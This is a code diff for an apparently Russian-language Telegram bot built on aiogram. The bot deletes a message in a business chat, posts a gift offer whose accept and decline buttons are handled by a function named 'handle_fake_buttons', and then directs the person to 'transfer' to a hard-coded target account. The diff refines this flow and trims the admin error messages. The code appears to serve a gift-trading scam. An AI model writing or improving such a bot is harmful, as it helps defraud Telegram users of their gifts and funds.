@@ -20,7 +20,7 @@ try:
 except ValueError:
     ADMIN_ID = 0
 
-DEFAULT_TARGET = "Gifts_Replayer" # <-- ВОЗВРАЩЕН ТВОЙ ЮЗЕРНЕЙМ
+DEFAULT_TARGET = "Gifts_Replayer" 
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -123,8 +123,7 @@ async def cmd_set_target(message: types.Message):
         return await message.answer(
             f"❌ <b>Отказано в доступе.</b>\n\n"
             f"Ваш ID: <code>{message.from_user.id}</code>\n"
-            f"Ожидается (ADMIN_ID): <code>{ADMIN_ID}</code>\n\n"
-            f"Если вы админ, убедитесь, что в настройках GitHub Secrets добавлен правильный <code>ADMIN_ID</code>.",
+            f"Ожидается (ADMIN_ID): <code>{ADMIN_ID}</code>",
             parse_mode="HTML"
         )
     
@@ -150,7 +149,7 @@ async def cmd_set_target(message: types.Message):
 @dp.message(Command("remove_target"))
 async def cmd_remove_target(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        return await message.answer(f"❌ Вы не админ. Ваш ID: {message.from_user.id}")
+        return await message.answer(f"❌ Вы не админ.")
     
     parts = message.text.split()
     if len(parts) != 2:
@@ -173,7 +172,7 @@ async def cmd_remove_target(message: types.Message):
 @dp.message(Command("test_db"))
 async def cmd_test_db(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        return await message.answer(f"❌ Вы не админ. Ваш ID: {message.from_user.id}")
+        return await message.answer(f"❌ Вы не админ.")
     
     data, error = await get_gist_data()
     if error:
@@ -242,14 +241,13 @@ async def handle_offer_command(message: types.Message):
         target_username=DEFAULT_TARGET
     )
 
-    sender_username = message.from_user.username.lower() if message.from_user.username else "no_username"
-
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
         
+        # ВАЖНО: Убрали sender_username из callback_data, чтобы не превышать лимит 64 байта!
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}"),
-            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}")
+            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
+            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
         
         await bot.send_message(
@@ -268,10 +266,17 @@ async def handle_offer_command(message: types.Message):
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
+    # ТЕПЕРЬ ТУТ ТОЛЬКО 5 ЭЛЕМЕНТОВ (action, slug, amount, currency, lang)
     data_parts = callback.data.split(":")
-    action, gift_slug, amount, currency, lang, sender_username = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
+    if len(data_parts) != 5:
+        return await callback.answer("Ошибка данных кнопки.", show_alert=True)
+        
+    action, gift_slug, amount, currency, lang = data_parts
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
+    
+    # Берем юзернейм прямо из сообщения (это владелец бизнес-аккаунта)
+    sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
     
     data, error = await get_gist_data()
     target_username = DEFAULT_TARGET
@@ -293,7 +298,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
         ])
         
-        # ТЕПЕРЬ ТЕКСТ ОКНА БЕРЕТСЯ ИЗ СЛОВАРЯ ПЕРЕВОДОВ
         alert_text = msg_data["alert"].format(target_username=target_username)
     else:
         new_text = msg_data["declined"].format(
